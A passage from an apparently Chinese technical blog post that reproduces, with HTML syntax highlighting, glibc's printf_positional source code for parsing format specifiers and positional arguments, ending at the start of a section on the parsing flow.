class=\"title\">argsbuf</span>;</span></span><br><span class=\"line\">  scratch_buffer_init (&amp;argsbuf);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Array with information about the needed arguments.  This has to</span></span><br><span class=\"line\"><span class=\"comment\">     be dynamically extensible.  */</span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> nspecs = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* The number of arguments the format string requests.  This will</span></span><br><span class=\"line\"><span class=\"comment\">     determine the size of the array needed to store the argument</span></span><br><span class=\"line\"><span class=\"comment\">     attributes.  */</span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> nargs = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Positional parameters refer to arguments directly.  This could</span></span><br><span class=\"line\"><span class=\"comment\">     also determine the maximum number of arguments.  Track the</span></span><br><span class=\"line\"><span class=\"comment\">     maximum number.  */</span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> max_ref_arg = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Just a counter.  */</span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> cnt;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (grouping == (<span class=\"type\">const</span> <span class=\"type\">char</span> *) <span class=\"number\">-1</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> COMPILE_WPRINTF</span></span><br><span class=\"line\">      thousands_sep = _NL_CURRENT_WORD (LC_NUMERIC,</span><br><span class=\"line\">\t\t\t\t\t_NL_NUMERIC_THOUSANDS_SEP_WC);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\">      thousands_sep = _NL_CURRENT (LC_NUMERIC, THOUSANDS_SEP);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">      grouping = _NL_CURRENT (LC_NUMERIC, GROUPING);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (*grouping == <span class=\"string\">&#x27;\\0&#x27;</span> || *grouping == CHAR_MAX)</span><br><span class=\"line\">\tgrouping = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"type\">const</span> UCHAR_T *f = lead_str_end; *f != L_(<span class=\"string\">&#x27;\\0&#x27;</span>);</span><br><span class=\"line\">       f = specs[nspecs++].next_fmt)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (nspecs == specs_limit)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (!scratch_buffer_grow_preserve (&amp;specsbuf))</span><br><span class=\"line\">\t    &#123;</span><br><span class=\"line\">\t      done = <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t      <span class=\"keyword\">goto</span> all_done;</span><br><span class=\"line\">\t    &#125;</span><br><span class=\"line\">\t  specs = specsbuf.data;</span><br><span class=\"line\">\t  specs_limit = specsbuf.length / <span class=\"keyword\">sizeof</span> (specs[<span class=\"number\">0</span>]);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Parse the format specifier.  */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> COMPILE_WPRINTF</span></span><br><span class=\"line\">      nargs += __parse_one_specwc (f, nargs, &amp;specs[nspecs], &amp;max_ref_arg);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\">      nargs += __parse_one_specmb (f, nargs, &amp;specs[nspecs], &amp;max_ref_arg);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Determine the number of arguments the format string consumes.  */</span></span><br><span class=\"line\">  nargs = MAX (nargs, max_ref_arg);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">union</span> <span class=\"title\">printf_arg</span> *<span class=\"title\">args_value</span>;</span></span><br><span class=\"line\">  <span class=\"type\">int</span> *args_size;</span><br><span class=\"line\">  <span class=\"type\">int</span> *args_type;</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"comment\">/* Calculate total size needed to represent a single argument</span></span><br><span class=\"line\"><span class=\"comment\">       across all three argument-related arrays.  */</span></span><br><span class=\"line\">    <span class=\"type\">size_t</span> bytes_per_arg</span><br><span class=\"line\">      = <span class=\"keyword\">sizeof</span> (*args_value) + <span class=\"keyword\">sizeof</span> (*args_size) + <span class=\"keyword\">sizeof</span> (*args_type);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!scratch_buffer_set_array_size (&amp;argsbuf, nargs, bytes_per_arg))</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">\tdone = <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">goto</span> all_done;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    args_value = argsbuf.data;</span><br><span class=\"line\">    <span class=\"comment\">/* Set up the remaining two arrays to each point past the end of</span></span><br><span class=\"line\"><span class=\"comment\">       the prior array, since space for all three has been allocated</span></span><br><span class=\"line\"><span class=\"comment\">       now.  */</span></span><br><span class=\"line\">    args_size = &amp;args_value[nargs].pa_int;</span><br><span class=\"line\">    args_type = &amp;args_size[nargs];</span><br><span class=\"line\">    <span class=\"built_in\">memset</span> (args_type, (mode_flags &amp; PRINTF_FORTIFY) != <span class=\"number\">0</span> ? <span class=\"string\">&#x27;\\xff&#x27;</span> : <span class=\"string\">&#x27;\\0&#x27;</span>,</span><br><span class=\"line\">\t    nargs * <span class=\"keyword\">sizeof</span> (*args_type));</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* XXX Could do sanity check here: If any element in ARGS_TYPE is</span></span><br><span class=\"line\"><span class=\"comment\">     still zero after this loop, format is invalid.  For now we</span></span><br><span class=\"line\"><span class=\"comment\">     simply use 0 as the value.  */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Fill in the types of all the arguments.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (cnt = <span class=\"number\">0</span>; cnt &lt; nspecs; ++cnt)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* If the width is determined by an argument this is an int.  */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (specs[cnt].width_arg != <span class=\"number\">-1</span>)</span><br><span class=\"line\">\targs_type[specs[cnt].width_arg] = PA_INT;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* If the precision is determined by an argument this is an int.  */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (specs[cnt].prec_arg != <span class=\"number\">-1</span>)</span><br><span class=\"line\">\targs_type[specs[cnt].prec_arg] = PA_INT;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">switch</span> (specs[cnt].ndata_args)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> <span class=\"number\">0</span>:\t\t<span class=\"comment\">/* No arguments.  */</span></span><br><span class=\"line\">\t  <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> <span class=\"number\">1</span>:\t\t<span class=\"comment\">/* One argument; we already have the</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t   type and size.  */</span></span><br><span class=\"line\">\t  args_type[specs[cnt].data_arg] = specs[cnt].data_arg_type;</span><br><span class=\"line\">\t  args_size[specs[cnt].data_arg] = specs[cnt].size;</span><br><span class=\"line\">\t  <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">default</span>:</span><br><span class=\"line\">\t  <span class=\"comment\">/* We have more than one argument for this format spec.</span></span><br><span class=\"line\"><span class=\"comment\">\t     We must call the arginfo function again to determine</span></span><br><span class=\"line\"><span class=\"comment\">\t     all the types.  */</span></span><br><span class=\"line\">\t  (<span class=\"type\">void</span>) (*__printf_arginfo_table[specs[cnt].info.spec])</span><br><span class=\"line\">\t    (&amp;specs[cnt].info,</span><br><span class=\"line\">\t     specs[cnt].ndata_args, &amp;args_type[specs[cnt].data_arg],</span><br><span class=\"line\">\t     &amp;args_size[specs[cnt].data_arg]);</span><br><span class=\"line\">\t  <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Now we know all the types and the order.  Fill in the argument</span></span><br><span class=\"line\"><span class=\"comment\">     values.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (cnt = <span class=\"number\">0</span>; cnt &lt; nargs; ++cnt)</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (args_type[cnt])</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> T(tag, mem, type)\t\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">\tcase tag:\t\t\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">\t  args_value[cnt].mem = va_arg (*ap_savep, type); \\</span></span><br><span class=\"line\"><span class=\"meta\">\t  break</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tT (PA_WCHAR, pa_wchar, <span class=\"type\">wint_t</span>);</span><br><span class=\"line\">      <span class=\"keyword\">case</span> PA_CHAR:\t\t\t\t<span class=\"comment\">/* Promoted.  */</span></span><br><span class=\"line\">      <span class=\"keyword\">case</span> PA_INT|PA_FLAG_SHORT:\t\t<span class=\"comment\">/* Promoted.  */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> LONG_MAX == INT_MAX</span></span><br><span class=\"line\">      <span class=\"keyword\">case</span> PA_INT|PA_FLAG_LONG:</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">\tT (PA_INT, pa_int, <span class=\"type\">int</span>);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> LONG_MAX == LONG_LONG_MAX</span></span><br><span class=\"line\">      <span class=\"keyword\">case</span> PA_INT|PA_FLAG_LONG:</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">\tT (PA_INT|PA_FLAG_LONG_LONG, pa_long_long_int, <span class=\"type\">long</span> <span class=\"type\">long</span> <span class=\"type\">int</span>);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> LONG_MAX != INT_MAX &amp;&amp; LONG_MAX != LONG_LONG_MAX</span></span><br><span class=\"line\"><span class=\"meta\"># <span class=\"keyword\">error</span> <span class=\"string\">&quot;he?&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">      <span class=\"keyword\">case</span> PA_FLOAT:\t\t\t\t<span class=\"comment\">/* Promoted.  */</span></span><br><span class=\"line\">\tT (PA_DOUBLE, pa_double, <span class=\"type\">double</span>);</span><br><span class=\"line\">      <span class=\"keyword\">case</span> PA_DOUBLE|PA_FLAG_LONG_DOUBLE:</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (__glibc_unlikely ((mode_flags &amp; PRINTF_LDBL_IS_DBL) != <span class=\"number\">0</span>))</span><br><span class=\"line\">\t  &#123;</span><br><span class=\"line\">\t    args_value[cnt].pa_double = va_arg (*ap_savep, <span class=\"type\">double</span>);</span><br><span class=\"line\">\t    args_type[cnt] &amp;= ~PA_FLAG_LONG_DOUBLE;</span><br><span class=\"line\">\t  &#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> __HAVE_FLOAT128_UNLIKE_LDBL</span></span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ((mode_flags &amp; PRINTF_LDBL_USES_FLOAT128) != <span class=\"number\">0</span>)</span><br><span class=\"line\">\t  args_value[cnt].pa_float128 = va_arg (*ap_savep, <span class=\"type\">_Float128</span>);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t  args_value[cnt].pa_long_double = va_arg (*ap_savep, <span class=\"type\">long</span> <span class=\"type\">double</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> PA_STRING:\t\t\t\t<span class=\"comment\">/* All pointers are the same */</span></span><br><span class=\"line\">      <span class=\"keyword\">case</span> PA_WSTRING:\t\t\t<span class=\"comment\">/* All pointers are the same */</span></span><br><span class=\"line\">\tT (PA_POINTER, pa_pointer, <span class=\"type\">void</span> *);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> T</span></span><br><span class=\"line\">      <span class=\"keyword\">default</span>:</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> ((args_type[cnt] &amp; PA_FLAG_PTR) != <span class=\"number\">0</span>)</span><br><span class=\"line\">\t  args_value[cnt].pa_pointer = va_arg (*ap_savep, <span class=\"type\">void</span> *);</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (__glibc_unlikely (__printf_va_arg_table != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t\t &amp;&amp; __printf_va_arg_table[args_type[cnt] - PA_LAST] != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t  &#123;</span><br><span class=\"line\">\t    args_value[cnt].pa_user = alloca (args_size[cnt]);</span><br><span class=\"line\">\t    (*__printf_va_arg_table[args_type[cnt] - PA_LAST])</span><br><span class=\"line\">\t      (args_value[cnt].pa_user, ap_savep);</span><br><span class=\"line\">\t  &#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t  <span class=\"built_in\">memset</span> (&amp;args_value[cnt], <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span> (args_value[cnt]));</span><br><span class=\"line\">\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">-1</span>:</span><br><span class=\"line\">\t<span class=\"comment\">/* Error case.  Not all parameters appear in N$ format</span></span><br><span class=\"line\"><span class=\"comment\">\t   strings.  We have no way to determine their type.  */</span></span><br><span class=\"line\">\tassert ((mode_flags &amp; PRINTF_FORTIFY) != <span class=\"number\">0</span>);</span><br><span class=\"line\">\t__libc_fatal (<span class=\"string\">&quot;*** invalid %N$ use detected ***\\n&quot;</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Now walk through all format specifiers and process them.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (; (<span class=\"type\">size_t</span>) nspecs_done &lt; nspecs; ++nspecs_done)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      STEP4_TABLE;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"type\">int</span> is_negative;</span><br><span class=\"line\">      <span class=\"class\"><span class=\"keyword\">union</span></span></span><br><span class=\"line\"><span class=\"class\">      &#123;</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> <span class=\"type\">int</span> longlong;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">int</span> word;</span><br><span class=\"line\">      &#125; number;</span><br><span class=\"line\">      <span class=\"type\">int</span> base;</span><br><span class=\"line\">      CHAR_T *<span class=\"built_in\">string</span>;\t\t<span class=\"comment\">/* Pointer to argument string.  */</span></span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Fill variables from values in struct.  */</span></span><br><span class=\"line\">      <span class=\"type\">int</span> alt = specs[nspecs_done].info.alt;</span><br><span class=\"line\">      <span class=\"type\">int</span> space = specs[nspecs_done].info.space;</span><br><span class=\"line\">      <span class=\"type\">int</span> left = specs[nspecs_done].info.left;</span><br><span class=\"line\">      <span class=\"type\">int</span> showsign = specs[nspecs_done].info.showsign;</span><br><span class=\"line\">      <span class=\"type\">int</span> group = specs[nspecs_done].info.group;</span><br><span class=\"line\">      <span class=\"type\">int</span> is_long_double __attribute__ ((unused))</span><br><span class=\"line\">\t= specs[nspecs_done].info.is_long_double;</span><br><span class=\"line\">      <span class=\"type\">int</span> is_short = specs[nspecs_done].info.is_short;</span><br><span class=\"line\">      <span class=\"type\">int</span> is_char = specs[nspecs_done].info.is_char;</span><br><span class=\"line\">      <span class=\"type\">int</span> is_long = specs[nspecs_done].info.is_long;</span><br><span class=\"line\">      <span class=\"type\">int</span> width = specs[nspecs_done].info.width;</span><br><span class=\"line\">      <span class=\"type\">int</span> prec = specs[nspecs_done].info.prec;</span><br><span class=\"line\">      <span class=\"type\">int</span> use_outdigits = specs[nspecs_done].info.i18n;</span><br><span class=\"line\">      <span class=\"type\">char</span> pad = specs[nspecs_done].info.pad;</span><br><span class=\"line\">      CHAR_T spec = specs[nspecs_done].info.spec;</span><br><span class=\"line\"></span><br><span class=\"line\">      CHAR_T *workend = work_buffer + WORK_BUFFER_SIZE;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Fill in last information.  */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (specs[nspecs_done].width_arg != <span class=\"number\">-1</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  <span class=\"comment\">/* Extract the field width from an argument.  */</span></span><br><span class=\"line\">\t  specs[nspecs_done].info.width =</span><br><span class=\"line\">\t    args_value[specs[nspecs_done].width_arg].pa_int;</span><br><span class=\"line\"></span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (specs[nspecs_done].info.width &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t    <span class=\"comment\">/* If the width value is negative left justification is</span></span><br><span class=\"line\"><span class=\"comment\">\t       selected and the value is taken as being positive.  */</span></span><br><span class=\"line\">\t    &#123;</span><br><span class=\"line\">\t      specs[nspecs_done].info.width *= <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t      left = specs[nspecs_done].info.left = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t    &#125;</span><br><span class=\"line\">\t  width = specs[nspecs_done].info.width;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (specs[nspecs_done].prec_arg != <span class=\"number\">-1</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  <span class=\"comment\">/* Extract the precision from an argument.  */</span></span><br><span class=\"line\">\t  specs[nspecs_done].info.prec =</span><br><span class=\"line\">\t    args_value[specs[nspecs_done].prec_arg].pa_int;</span><br><span class=\"line\"></span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (specs[nspecs_done].info.prec &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t    <span class=\"comment\">/* If the precision is negative the precision is</span></span><br><span class=\"line\"><span class=\"comment\">\t       omitted.  */</span></span><br><span class=\"line\">\t    specs[nspecs_done].info.prec = <span class=\"number\">-1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t  prec = specs[nspecs_done].info.prec;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Process format specifiers.  */</span></span><br><span class=\"line\">      <span class=\"keyword\">while</span> (<span class=\"number\">1</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  <span class=\"keyword\">extern</span> printf_function **__printf_function_table;</span><br><span class=\"line\">\t  <span class=\"type\">int</span> function_done;</span><br><span class=\"line\"></span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (spec &lt;= UCHAR_MAX</span><br><span class=\"line\">\t      &amp;&amp; __printf_function_table != <span class=\"literal\">NULL</span></span><br><span class=\"line\">\t      &amp;&amp; __printf_function_table[(<span class=\"type\">size_t</span>) spec] != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t    &#123;</span><br><span class=\"line\">\t      <span class=\"type\">const</span> <span class=\"type\">void</span> **ptr = alloca (specs[nspecs_done].ndata_args</span><br><span class=\"line\">\t\t\t\t\t * <span class=\"keyword\">sizeof</span> (<span class=\"type\">const</span> <span class=\"type\">void</span> *));</span><br><span class=\"line\"></span><br><span class=\"line\">\t      <span class=\"comment\">/* Fill in an array of pointers to the argument values.  */</span></span><br><span class=\"line\">\t      <span class=\"keyword\">for</span> (<span class=\"type\">unsigned</span> <span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; specs[nspecs_done].ndata_args;</span><br><span class=\"line\">\t\t   ++i)</span><br><span class=\"line\">\t\tptr[i] = &amp;args_value[specs[nspecs_done].data_arg + i];</span><br><span class=\"line\"></span><br><span class=\"line\">\t      <span class=\"comment\">/* Call the function.  */</span></span><br><span class=\"line\">\t      function_done = __printf_function_table[(<span class=\"type\">size_t</span>) spec]</span><br><span class=\"line\">\t\t(s, &amp;specs[nspecs_done].info, ptr);</span><br><span class=\"line\"></span><br><span class=\"line\">\t      <span class=\"keyword\">if</span> (function_done != <span class=\"number\">-2</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t  <span class=\"comment\">/* If an error occurred we don&#x27;t have information</span></span><br><span class=\"line\"><span class=\"comment\">\t\t     about # of chars.  */</span></span><br><span class=\"line\">\t\t  <span class=\"keyword\">if</span> (function_done &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t    &#123;</span><br><span class=\"line\">\t\t      <span class=\"comment\">/* Function has set errno.  */</span></span><br><span class=\"line\">\t\t      done = <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t\t      <span class=\"keyword\">goto</span> all_done;</span><br><span class=\"line\">\t\t    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t  done_add (function_done);</span><br><span class=\"line\">\t\t  <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t  JUMP (spec, step4_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_data args_value[specs[nspecs_done].data_arg]</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_int() process_arg_data.pa_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_long_int() process_arg_data.pa_long_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_long_long_int() process_arg_data.pa_long_long_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_pointer() process_arg_data.pa_pointer</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_string() process_arg_data.pa_string</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_unsigned_int() process_arg_data.pa_u_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_unsigned_long_int() process_arg_data.pa_u_long_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_unsigned_long_long_int() process_arg_data.pa_u_long_long_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_wchar_t() process_arg_data.pa_wchar</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_wstring() process_arg_data.pa_wstring</span></span><br><span class=\"line\">\t  process_arg ();</span><br><span class=\"line\">\t  process_string_arg ();</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_data</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_long_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_long_long_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_pointer</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_string</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_unsigned_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_unsigned_long_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_unsigned_long_long_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_wchar_t</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_wstring</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t  LABEL (form_float):</span><br><span class=\"line\">\t  LABEL (form_floathex):</span><br><span class=\"line\">\t  &#123;</span><br><span class=\"line\">\t    <span class=\"type\">const</span> <span class=\"type\">void</span> *ptr</span><br><span class=\"line\">\t      = (<span class=\"type\">const</span> <span class=\"type\">void</span> *) &amp;args_value[specs[nspecs_done].data_arg];</span><br><span class=\"line\">\t    <span class=\"keyword\">if</span> (__glibc_unlikely ((mode_flags &amp; PRINTF_LDBL_IS_DBL) != <span class=\"number\">0</span>))</span><br><span class=\"line\">\t      &#123;</span><br><span class=\"line\">\t\tspecs[nspecs_done].data_arg_type = PA_DOUBLE;</span><br><span class=\"line\">\t\tspecs[nspecs_done].info.is_long_double = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t      &#125;</span><br><span class=\"line\">\t    SETUP_FLOAT128_INFO (specs[nspecs_done].info);</span><br><span class=\"line\"></span><br><span class=\"line\">\t    <span class=\"type\">int</span> function_done</span><br><span class=\"line\">\t      = __printf_fp_spec (s, &amp;specs[nspecs_done].info, &amp;ptr);</span><br><span class=\"line\">\t    <span class=\"keyword\">if</span> (function_done &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t      &#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">/* Error in print handler; up to handler to set errno.  */</span></span><br><span class=\"line\">\t\tdone = <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> all_done;</span><br><span class=\"line\">\t      &#125;</span><br><span class=\"line\">\t    done_add (function_done);</span><br><span class=\"line\">\t  &#125;</span><br><span class=\"line\">\t  <span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t  LABEL (form_unknown):</span><br><span class=\"line\">\t  &#123;</span><br><span class=\"line\">\t    <span class=\"type\">unsigned</span> <span class=\"type\">int</span> i;</span><br><span class=\"line\">\t    <span class=\"type\">const</span> <span class=\"type\">void</span> **ptr;</span><br><span class=\"line\"></span><br><span class=\"line\">\t    ptr = alloca (specs[nspecs_done].ndata_args</span><br><span class=\"line\">\t\t\t  * <span class=\"keyword\">sizeof</span> (<span class=\"type\">const</span> <span class=\"type\">void</span> *));</span><br><span class=\"line\"></span><br><span class=\"line\">\t    <span class=\"comment\">/* Fill in an array of pointers to the argument values.  */</span></span><br><span class=\"line\">\t    <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; specs[nspecs_done].ndata_args; ++i)</span><br><span class=\"line\">\t      ptr[i] = &amp;args_value[specs[nspecs_done].data_arg + i];</span><br><span class=\"line\"></span><br><span class=\"line\">\t    <span class=\"comment\">/* Call the function.  */</span></span><br><span class=\"line\">\t    function_done = printf_unknown (s, &amp;specs[nspecs_done].info,</span><br><span class=\"line\">\t\t\t\t\t    ptr);</span><br><span class=\"line\"></span><br><span class=\"line\">\t    <span class=\"comment\">/* If an error occurred we don&#x27;t have information about #</span></span><br><span class=\"line\"><span class=\"comment\">\t       of chars.  */</span></span><br><span class=\"line\">\t    <span class=\"keyword\">if</span> (function_done &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t      &#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">/* Function has set errno.  */</span></span><br><span class=\"line\">\t\tdone = <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> all_done;</span><br><span class=\"line\">\t      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t    done_add (function_done);</span><br><span class=\"line\">\t  &#125;</span><br><span class=\"line\">\t  <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Write the following constant string.  */</span></span><br><span class=\"line\">      outstring (specs[nspecs_done].end_of_fmt,</span><br><span class=\"line\">\t\t specs[nspecs_done].next_fmt</span><br><span class=\"line\">\t\t - specs[nspecs_done].end_of_fmt);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> all_done:</span><br><span class=\"line\">  scratch_buffer_free (&amp;argsbuf);</span><br><span class=\"line\">  scratch_buffer_free (&amp;specsbuf);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> done;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"解析流程\"><a href=\"#解析流程\" class=\"headerlink\" title=\"解析流程\"></a>解析流程</h2><h3 id=\"无-“-”符\"><a href=\"#无-“-”符\" class=\"headerlink\" title=\"无 “$”符\"></a>无 